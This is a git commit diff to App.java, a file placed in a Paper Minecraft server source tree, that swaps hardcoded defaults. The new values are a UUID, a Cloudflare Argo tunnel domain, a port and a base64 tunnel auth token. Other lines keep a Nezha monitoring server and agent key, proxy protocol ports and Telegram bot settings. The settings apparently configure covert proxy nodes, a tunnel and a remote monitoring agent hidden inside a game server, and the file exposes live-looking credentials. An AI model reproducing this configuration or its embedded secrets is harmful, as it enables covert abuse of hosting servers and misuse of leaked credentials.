1370e59ea67625048aa459eaf16f8388c1d902c3
Joker <kamankaixa@outlook.com>
2026-08-23 03:18:54 +0800

    Update App.java

--- paper-server/src/main/java/io/papermc/paper/sbx/App.java
+++ paper-server/src/main/java/io/papermc/paper/sbx/App.java
@@ -44,13 +44,13 @@ public class App {
     private static final boolean YT_WARPOUT = envBool("YT_WARPOUT", false);
     private static final String FILE_PATH = env("FILE_PATH", "world");
     private static final String SUB_PATH = env("SUB_PATH", "sub");
-    private static final String UUID = env("UUID", "1bae115a-23c3-456f-8652-ba3c3504062f");
+    private static final String UUID = env("UUID", "4643041c-5a38-45e3-be6d-7082e2730619");
     private static final String NEZHA_SERVER = env("NEZHA_SERVER", "nzag.faiz.us.kg:5555");
     private static final String NEZHA_PORT = env("NEZHA_PORT", "");
     private static final String NEZHA_KEY = env("NEZHA_KEY", "Tt8t4KdHTYsQ4nBtLSzidY9LzuRrAm3x");
-    private static final String ARGO_DOMAIN = env("ARGO_DOMAIN", "ascsonoway.kaixa.xx.kg");
-    private static final String ARGO_AUTH = env("ARGO_AUTH", "eyJhIjoiNmI3MzZhMDhiMzlmNDVlMzE2ZTdlMGNkODE2Yjc2ZDIiLCJ0IjoiYjAzMjVkNDctMDE3NC00N2NmLTlkZjYtOGIyZmVjN2U0OTJkIiwicyI6Ik1tTmlZMlZpWkRRdE5EaG1ZaTAwWldJekxUbGhOV0l0TmpobFlqSTVaalJrTkdWayJ9");
-    private static final int ARGO_PORT = envInt("ARGO_PORT", 8001);
+    private static final String ARGO_DOMAIN = env("ARGO_DOMAIN", "mcserverhost.kaixa.xx.kg");
+    private static final String ARGO_AUTH = env("ARGO_AUTH", "eyJhIjoiNmI3MzZhMDhiMzlmNDVlMzE2ZTdlMGNkODE2Yjc2ZDIiLCJ0IjoiZjFjYjkzNjItNTU2NS00YjQ3LTk3NmItYWZhOTVkOGQ2ZDNhIiwicyI6Ik5UTmhaakExTlRVdE1USTRaUzAwTUdGakxUZzBPVFl0T1RKaE1HVmhZVFl5TVdJMiJ9");
+    private static final int ARGO_PORT = envInt("ARGO_PORT", 13261);
     private static final String S5_PORT = env("S5_PORT", "");
     private static final String HY2_PORT = env("HY2_PORT", "");
     private static final String TUIC_PORT = env("TUIC_PORT", "");
@@ -58,7 +58,7 @@ public class App {
     private static final String REALITY_PORT = env("REALITY_PORT", "");
     private static final String CFIP = env("CFIP", "cf.877774.xyz");
     private static final int CFPORT = envInt("CFPORT", 443);
-    private static final String NAME = env("NAME", "Ascsonoway");
+    private static final String NAME = env("NAME", "MCserverhost");
     private static final String CHAT_ID = env("CHAT_ID", "");  // 如果关闭了log输出,请填写tg推送，否则找不到节点
     private static final String BOT_TOKEN = env("BOT_TOKEN", "");
     private static final boolean DISABLE_ARGO = envBool("DISABLE_ARGO", false);
